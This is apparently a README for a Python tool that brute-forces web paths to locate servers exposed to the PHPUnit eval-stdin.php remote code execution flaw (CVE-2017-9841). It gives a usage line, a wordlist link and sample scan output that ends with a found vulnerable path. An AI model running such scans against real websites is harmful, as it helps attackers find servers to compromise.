# phpunit-brute

Tool to try multiple paths for PHPunit RCE (CVE-2017-9841) and it will log found paths to found.txt in the dir.

It uses the following list of paths `https://raw.githubusercontent.com/random-robbie/bruteforce-lists/master/phpunit.txt`

if you have a path that is not on there please submit a PR


```
usage: phpunit-brute.py [-h] -u URL [-p PROXY]
phpunit-brute.py: error: the following arguments are required: -u/--url
```


Example
---

```
python3 phpunit-brute.py -u http://someoldwebsite.com


[-] No Luck for /_inc/vendor/stripe/stripe-php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /_staff/cron/php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /_staff/php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /~champiot/Laravel E2N test/tuto_laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /~champiot/Laravel%20E2N%20test/tuto_laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /~champiot/tuto_laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /172410101040/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /1board/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[-] No Luck for /20170811125232/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [-]
[+] Found RCE for http://someoldwebsite.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [+]
```
